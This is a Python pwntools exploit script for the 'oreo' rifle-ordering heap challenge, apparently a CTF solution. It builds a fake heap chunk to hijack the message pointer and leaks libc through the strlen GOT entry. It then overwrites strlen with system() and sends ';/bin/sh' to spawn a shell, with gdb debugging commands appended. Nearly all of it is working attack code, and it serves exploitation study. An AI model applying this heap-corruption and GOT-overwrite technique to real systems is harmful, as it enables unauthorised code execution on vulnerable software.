# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
#r = remote('wildwildweb.fluxfingers.net', 1414)
name = './oreo'
r = process(name)

libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

# 1. Add new rifle
# 2. Show added rifles
# 3. Order selected rifles
# 4. Leave a Message with your Order
# 5. Show current stats
# 6. Exit!
# Action:

def add(name, desc):
    # r.recvuntil("Action:")
    r.sendline("1")
    # r.recvuntil("Rifle name:")
    r.sendline(name)
    # r.recvuntil("Rifle description:")
    r.sendline(desc)

def show_added():
    # r.recvuntil("Action:")
    r.sendline("2")

def order():
    # r.recvuntil("Action:")
    r.sendline("3")

def msg(data):
    # r.recvuntil("Action:")
    r.sendline("4")
    r.send(data)


def show_stat():
    # r.recvuntil("Action:")
    r.sendline("5")

# r.recvuntil("Action:")
# print("????")
# add("A","A")
for i in range(0,0x40):
    add("A","A")

payload = ''
payload += 27*"B"+p32(0x0804A2A8) # message ptr
add(payload, "B")

msg(p32(0)*4+2*p64(0)+ p32(0) +p32(0x81))

r.sendline("3")
r.sendline("3")
r.recvuntil("submitted!")


payload = ''
payload +=p32(binn.got['strlen'])
add("B", payload)

show_stat()
r.recvuntil("Order Message: ")
libc_base = u32(r.recv(4)) -  0x7e440
print("libc_base ", hex(libc_base))

# 0x3ac5c, 0x3ac5e,0x3ac62 0x3ac69 0x5fbc5 0x5fbc6
# msg(p32(libc_base+ 0x5fbc6)) # write onegaedit


# msg(p32(libc_base+0x3ada0)+';/bin/sh\x00') # write system
msg(p32(libc_base+0x3ada0)) # write system

# add("AAAA","AAAA")
# r.sendline("1")
# r.recvuntil("Rifle name:")
r.send(";/bin/sh\0")

r.sendline("pwd")
r.sendline("pwd")
# r.send("/bin/sh\0")
# r.send("AAAA\0")
# r.recvuntil("Rifle description:")
# r.sendline(desc)



#print(str(r.proc.pid))
gdb.attach(r, """
echo br * 0x8048609
set follow-fork-mode child
heap
echo x/10gx 0x0804A2A8-0x8 \\n
x/10gx 0x0804A2A8-0x8
echo rifle_ptr \\n
x/gx 0x0804A288
echo msg \\n
x/10gx 0x804a298

""");
#print(str(r.proc.pid))
print("xxx" ,hex(binn.got['strlen']))
r.interactive()

